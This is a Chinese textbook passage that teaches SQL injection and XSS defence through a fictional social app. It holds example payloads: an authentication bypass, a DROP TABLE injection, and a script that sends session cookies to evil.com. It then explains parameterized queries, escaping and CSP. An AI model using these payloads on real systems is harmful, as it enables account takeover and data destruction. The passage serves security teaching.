#### SQL 注入

回想第 5 章：关系型数据库解释 SQL 查询。考虑这段代码（伪代码）：


    user_input = request.get("username")
    query = f"SELECT * FROM users WHERE username = '{user_input}'"
    db.execute(query)


如果用户提交用户名 `alice`，查询变成 `SELECT * FROM users WHERE username = 'alice'`——无害。

但如果用户提交 `' OR '1'='1`，查询变成：


    SELECT * FROM users WHERE username = '' OR '1'='1'


条件 `'1'='1'` 永远为真，因此该查询返回数据库中所有用户。攻击者完全绕过了认证。

更具破坏性的输入：`'; DROP TABLE users; --` 使查询变成：


    SELECT * FROM users WHERE username = ''; DROP TABLE users; --'


这删除了整个 users 表。所有用户数据丢失。

SQL 注入之所以有效，是因为应用通过字符串拼接构建 SQL 查询，把用户输入当作 SQL 语法。修复方法是**参数化查询（parameterized queries）**（也称 prepared statements）：


    query = "SELECT * FROM users WHERE username = ?"
    db.execute(query, [user_input])


在参数化查询中，数据库驱动将查询结构与数据分开。用户输入被视为数据值，永远不是 SQL 语法。无论用户提交什么用户名，都无法改变 SQL 查询结构。

参数化查询是防御 SQL 注入唯一正确的方法。输入清理——试图检测并移除危险字符——不够，因为攻击模式比清理规则演化更快。


#### 跨站脚本（XSS）

SocialSnap 允许用户写帖子。一个幼稚实现直接存储帖子内容并作为 HTML 渲染：


    <div class="post">{{ post.content }}</div>


如果用户发布 `<script>document.cookie = document.cookie + document.domain; fetch('https://evil.com/steal?c=' + document.cookie)</script>`，这段脚本会在加载该帖子的每个浏览器中执行。脚本窃取查看用户的会话 cookie 并发送到攻击者服务器。然后攻击者可冒充该用户。

这是**存储型 XSS**（恶意脚本存储在数据库中，任何用户查看时执行）。它极具破坏力，因为一次发帖就能破坏数千用户。

**反射型 XSS** 类似，但使用 URL 参数：恶意链接如 `socialsnap.com/search?q=<script>...</script>` 使脚本反射回搜索结果页并执行。

修复方法：在渲染用户内容前进行 **HTML 编码（转义）**。`<script>` 变成 `&lt;script&gt;`——浏览器把它显示为字面文本而非执行。现代框架（React、Vue、Angular）默认转义用户内容，因此大幅降低 XSS 风险。危险发生在开发者明确选择不转义时：React 中的 `dangerouslySetInnerHTML` 之所以这样命名，是有原因的。

额外防御：**内容安全策略（Content Security Policy，CSP）**——一种 HTTP header，指示浏览器只执行可信来源的脚本（`script-src 'self'` 意味着只执行同源的脚本）。即使注入 XSS payload，CSP 也阻止其加载外部脚本。
